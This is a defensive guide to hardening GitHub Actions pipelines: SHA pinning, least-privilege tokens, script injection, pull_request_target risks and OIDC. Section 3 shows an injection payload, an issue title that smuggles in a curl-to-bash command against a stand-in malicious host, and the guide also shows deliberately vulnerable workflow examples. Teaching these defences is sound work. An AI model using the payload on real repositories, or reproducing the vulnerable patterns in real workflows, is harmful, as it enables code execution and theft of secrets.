# GitHub Actions Security Best Practices — Pipeline Hardening Guide

A comprehensive guide to securing your GitHub Actions workflows, runners, and secrets. Attackers increasingly target CI/CD pipelines as the weakest link to gain access to production environments or execute supply chain attacks.

---

## 🔐 1. Pin Actions to Full Length Commit SHAs

Tags (like `@v3`) and branches (like `@main`) are mutable. An attacker who compromises a third-party action's repository can force-push a malicious update to the `v3` tag, instantly compromising your workflow.

### The Rule: Pin by SHA
```yaml
# ❌ BAD: Mutable tag
uses: actions/checkout@v4

# ❌ BAD: Mutable branch
uses: actions/checkout@main

# ✅ GOOD: Immutable commit SHA (with comment for readability)
uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
```

> **Tip:** You can use tools like Dependabot or Renovate to automatically update pinned SHAs when new versions are released.

---

## 🛡️ 2. Apply the Principle of Least Privilege with `permissions`

By default, the `GITHUB_TOKEN` provided to your workflow might have broad permissions (depending on repo settings). Always explicitly declare what permissions the workflow needs. If the `permissions` block is present, all unlisted scopes default to `none`.

```yaml
name: Production Build

on: [push]

# ✅ GOOD: Set default permissions for the entire workflow
permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    # ✅ BEST: Override permissions per-job based on exact needs
    permissions:
      contents: read
      packages: write   # Needed to push to GHCR
      id-token: write   # Needed for OIDC auth to AWS/GCP
    steps:
      - uses: actions/checkout@b4ffde...
```

---

## 💉 3. Prevent Script Injection

Never interpolate untrusted input directly into a `run` script. Untrusted inputs include issue titles, PR bodies, commit messages, and author names.

### The Vulnerability
```yaml
# ❌ CRITICAL VULNERABILITY: Script Injection
name: Issue Greeter
on: issues
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Thanks for opening issue: ${{ github.event.issue.title }}"
```
If an attacker sets the issue title to: `Title"; curl http://malicious.com | bash; echo "`, the workflow will execute the curl command.

### The Fix: Bind to Environment Variables
```yaml
# ✅ GOOD: Bind untrusted input to env vars, then reference the env var
name: Issue Greeter
on: issues
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - env:
          ISSUE_TITLE: ${{ github.event.issue.title }}
        run: |
          echo "Thanks for opening issue: $ISSUE_TITLE"
```
Bash handles environment variable expansion safely.

---

## 🛑 4. Beware of `pull_request_target`

The `pull_request_target` event runs the workflow in the context of the **base** repository, giving it access to repository secrets and write permissions. It is meant to allow workflows to comment on forks.

### The Danger
If a workflow triggered by `pull_request_target` checks out the attacker's PR code and executes it (e.g., running `npm install` or `make build`), the attacker's code runs with access to your production secrets!

```yaml
# ❌ CRITICAL VULNERABILITY: Executing untrusted code with secrets
on:
  pull_request_target:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      # Checking out the attacker's untrusted PR code
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
          
      # Running the attacker's code while providing a secret!
      - run: npm install && npm test
        env:
          API_KEY: ${{ secrets.PROD_API_KEY }}
```

### The Fix
If you must build PRs from forks, use the standard `pull_request` trigger. It runs in a restrictive context with no access to secrets and a read-only token. 

If you absolutely need `pull_request_target` to label PRs or leave comments, **NEVER checkout and execute the PR's code in that workflow**.

---

## 🔑 5. Use OIDC Instead of Long-Lived Secrets

(Covered in Lab 01). Never store `AWS_ACCESS_KEY_ID` or `GCP_SA_KEY` in GitHub Secrets. Use OpenID Connect (OIDC) to exchange a short-lived GitHub token for cloud credentials.

---

## 🛡️ Security Checklist

| Category | Best Practice | Priority |
|---|---|---|
| **Dependencies** | Pin 3rd-party actions to full commit SHAs | 🔴 Critical |
| **Permissions** | Explicitly define `permissions: { contents: read }` at the top of every workflow | 🔴 Critical |
| **Authentication** | Use OIDC for cloud provider access instead of static keys | 🔴 Critical |
| **Injection** | Map untrusted `${{ github.* }}` contexts to `env` vars before using them in `run` scripts | 🔴 Critical |
| **Triggers** | Never execute PR code during a `pull_request_target` workflow | 🔴 Critical |
| **Secrets** | Store production secrets in Environment Secrets, not Repository Secrets | 🟡 High |
| **Runners** | Do not run public repository workflows on self-hosted runners without strict isolation | 🔴 Critical |
